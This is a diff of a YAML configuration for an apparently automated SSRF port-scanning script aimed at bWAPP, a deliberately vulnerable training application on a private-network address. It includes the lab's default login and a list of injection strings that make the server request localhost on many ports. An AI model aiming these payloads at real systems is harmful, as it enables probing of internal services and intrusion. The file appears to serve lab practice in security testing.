@@ -1,63 +1,98 @@
-remote_host: '192.168.1.151'
+log_level: 'INFO'
+
+remote_host: '192.168.1.154'
 remote_port: '80'
 
 login_endpoint: "/bWAPP/login.php"
 post_login_injection_data: 
-  login: bee
-  password: bug 
-  security_level: 0
-  form: submit
+  login: 'bee'
+  password: 'bug' 
+  security_level: '0'
+  form: 'submit'
   
 session_cookie_names: 
   - "PHPSESSID"
   - "security_level"
 
 vuln_webpage: "/bWAPP/rlfi.php"
+
 ssrf_injections: 
   - name: "PORT-21"
-    injection: "language=http://127.0.0.1:21/&action=go"
+    hostname: "127.0.0.1"
+    port: "21"
+    injection: "language=http://{hostname}:{port}&action=go"
   
   - name: "PORT-22"
-    injection: "language=http://127.0.0.1:22/&action=go"
+    hostname: "127.0.0.1"
+    port: "22"
+    injection: "language=http://{hostname}:{port}&action=go"
   
   - name: "PORT-23"
-    injection: "language=http://127.0.0.1:23/&action=go"
+    hostname: "127.0.0.1"
+    port: "23"
+    injection: "language=http://{hostname}:{port}&action=go"
   
   - name: "PORT-25"
-    injection: "language=http://127.0.0.1:25/&action=go"
+    hostname: "127.0.0.1"
+    port: "25"
+    injection: "language=http://{hostname}:{port}&action=go"
   
   - name: "PORT-80"
-    injection: "language=http://127.0.0.1:80/&action=go"
+    hostname: "127.0.0.1"
+    port: "80"
+    injection: "language=http://{hostname}:{port}&action=go"
 
   - name: "PORT-123"
-    injection: "language=http://127.0.0.1:123/&action=go"
+    hostname: "127.0.0.1"
+    port: "123"
+    injection: "language=http://{hostname}:{port}&action=go"
 
   - name: "PORT-443"
-    injection: "language=http://127.0.0.1:443/&action=go"
+    hostname: "127.0.0.1"
+    port: "443"
+    injection: "language=http://{hostname}:{port}&action=go"
 
   - name: "PORT-8080"
-    injection: "language=http://127.0.0.1:8080/&action=go"
+    hostname: "127.0.0.1"
+    port: "8080"
+    injection: "language=http://{hostname}:{port}&action=go"
 
   - name: "PORT-8443"
-    injection: "language=http://127.0.0.1:8443/&action=go"
+    hostname: "127.0.0.1"
+    port: "8443"
+    injection: "language=http://{hostname}:{port}&action=go"
 
   - name: "PORT-9443"
-    injection: "language=http://127.0.0.1:9443/&action=go"
+    hostname: "127.0.0.1"
+    port: "9443"
+    injection: "language=http://{hostname}:{port}&action=go"
 
   - name: "PORT-9080"
-    injection: "language=http://127.0.0.1:9080/&action=go"
+    hostname: "127.0.0.1"
+    port: "9080"
+    injection: "language=http://{hostname}:{port}&action=go"
 
   - name: "PORT-9999"
-    injection: "language=http://127.0.0.1:9999/&action=go"
+    hostname: "127.0.0.1"
+    port: "9999"
+    injection: "language=http://{hostname}:{port}&action=go"
 
   - name: "PORT-10000"
-    injection: "language=http://127.0.0.1:10000/&action=go"
+    hostname: "127.0.0.1"
+    port: "10000"
+    injection: "language=http://{hostname}:{port}&action=go"
 
   - name: "PORT-14400"
-    injection: "language=http://127.0.0.1:14400/&action=go"
+    hostname: "127.0.0.1"
+    port: "14400"
+    injection: "language=http://{hostname}:{port}&action=go"
 
   - name: "PORT-20000"
-    injection: "language=http://127.0.0.1:20000/&action=go"
+    hostname: "127.0.0.1"
+    port: "20000"
+    injection: "language=http://{hostname}:{port}&action=go"
 
   - name: "PORT-65536"
-    injection: "language=http://127.0.0.1:65536/&action=go"
+    hostname: "127.0.0.1"
+    port: "65536"
+    injection: "language=http://{hostname}:{port}&action=go"
